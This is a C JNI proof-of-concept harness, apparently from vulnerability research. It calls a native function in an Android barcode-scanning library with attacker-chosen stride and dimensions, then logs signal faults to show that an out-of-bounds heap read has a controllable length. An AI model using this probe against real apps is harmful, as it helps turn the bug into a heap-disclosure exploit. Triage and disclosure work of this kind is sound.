/*
 * bhctl.c — is the OOB read distance ATTACKER-CONTROLLED?
 *
 * The read loop advances by the caller-supplied `stride` each iteration for `height` iterations.
 * If the fault address scales with `stride`, the over-read length is attacker-chosen, which
 * upgrades the bug from "crash somewhere past the buffer" to a controllable over-read
 * (potential heap disclosure) rather than an arbitrary crash.
 *
 * Uses an exact-size heap buffer (GetPrimitiveArrayCritical) so buffer start/end are known.
 */
#define _GNU_SOURCE 1
#include <jni.h>
#include <dlfcn.h>
#include <android/log.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,"BHCTL",__VA_ARGS__)
typedef jobject (*fn4)(JNIEnv*,jclass,jint,jint,jint,jbyteArray,jobject);
static uintptr_t g_buf,g_end; static size_t g_len;
static int g_dw,g_dh,g_stride; static void *g_base;

static void handler(int s,siginfo_t *si,void *uc){
    ucontext_t *c=(ucontext_t*)uc;
    unsigned long pc=(unsigned long)c->uc_mcontext.pc;
    long past=(long)((uintptr_t)si->si_addr - g_end);
    char b[320];
    snprintf(b,sizeof b,
      "BHCTL sig=%d fault=%p buf=%#lx end=%#lx len=%zu dw=%d dh=%d stride=%d | past_end=%ld off_lib=%#lx\n",
      s,si->si_addr,(unsigned long)g_buf,(unsigned long)g_end,g_len,g_dw,g_dh,g_stride,past,
      g_base?(pc-(unsigned long)g_base):0);
    __android_log_write(ANDROID_LOG_FATAL,"BHCTL",b);
    _exit(97);
}
JNIEXPORT jint JNICALL
Java_com_vrp_probe_BarhopperFuzz_nCtl(JNIEnv *env,jclass cls,jstring so,jobject opts,
                                    jint dw,jint dh,jint stride,jint bufsize){
    struct sigaction sa;memset(&sa,0,sizeof sa);
    sa.sa_sigaction=handler;sa.sa_flags=SA_SIGINFO;
    sigaction(SIGSEGV,&sa,NULL);sigaction(SIGBUS,&sa,NULL);
    const char*p=(*env)->GetStringUTFChars(env,so,0);
    void*L=dlopen(p,RTLD_NOW); if(!L){LOGE("dlopen %s",dlerror());return -1;}
    Dl_info di; g_base=0;
    { void*s=dlsym(L,"Java_com_google_android_libraries_barhopper_Barhopper_parseRawValue");
      if(s&&dladdr(s,&di)) g_base=di.dli_fbase; }
    fn4 r=(fn4)dlsym(L,"Java_com_google_android_libraries_barhopper_Barhopper_recognizeStridedNative");
    if(!r){LOGE("no sym");return -2;}
    g_dw=dw;g_dh=dh;g_stride=stride;g_len=(size_t)bufsize;
    jbyteArray a=(*env)->NewByteArray(env,(jsize)bufsize);
    jbyte*e=(*env)->GetByteArrayElements(a,0,0);
    memset(e,0x41,bufsize);
    g_buf=(uintptr_t)e; g_end=g_buf+g_len;
    LOGE("BHCTL SETUP buf=%#lx end=%#lx len=%zu dw=%d dh=%d stride=%d",
         (unsigned long)g_buf,(unsigned long)g_end,g_len,dw,dh,stride);
    jobject res=r(env,cls,dw,dh,stride,a,opts);
    if((*env)->ExceptionCheck(env))(*env)->ExceptionClear(env);
    LOGE("BHCTL NOCRASH dw=%d dh=%d stride=%d len=%zu (res=%p)",dw,dh,stride,g_len,(void*)res);
    (*env)->ReleaseByteArrayElements(a,e,0,0);
    (*env)->DeleteLocalRef(env,a);
    (*env)->ReleaseStringUTFChars(env,so,p);
    return 0;
}
